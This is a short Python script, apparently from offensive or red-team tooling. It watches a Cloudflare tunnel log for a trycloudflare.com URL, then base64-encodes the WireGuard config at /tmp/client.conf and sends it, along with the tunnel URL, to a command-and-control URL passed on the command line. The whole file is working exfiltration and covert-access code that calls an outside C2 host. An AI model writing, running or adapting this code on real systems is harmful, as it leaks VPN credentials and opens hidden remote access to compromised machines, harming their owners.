import argparse
import httpx
import base64


def tail_logs(logpath: str) -> str:
    # Watch log file until our URL appears
    url = None
    while not url:
        with open(logpath, "r") as cf_log:
            lines = cf_log.readlines()
            for line in lines:
                if ".trycloudflare.com" in line:
                    url = line.split("|")[1].strip()
                    break

    return url


def send_url_to_c2(local_url: str, c2_url: str):
    # Send local URL back to C2 URL
    params = {"url": local_url}
    httpx.get(c2_url, params=params)


def send_config_to_c2(c2_url: str) -> None:
    # Encode and send wireguard config back to C2 URL
    file_path = "/tmp/client.conf"

    # Read the file in binary mode
    with open(file_path, "rb") as file:
        file_contents = file.read()

    # Encode the file contents in base64
    encoded_contents = base64.b64encode(file_contents)

    # Convert the bytes object to a string (if needed)
    encoded_string = encoded_contents.decode("utf-8")

    # Print or use the encoded string as needed
    params = {"config": encoded_string}
    httpx.get(c2_url, params=params)


def main(logpath: str, c2_url: str):
    url = tail_logs(logpath)
    send_config_to_c2(c2_url)
    send_url_to_c2(url, c2_url)
    print(url)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("c2_url")
    args = parser.parse_args()
    main("/tmp/cf.log", args.c2_url)
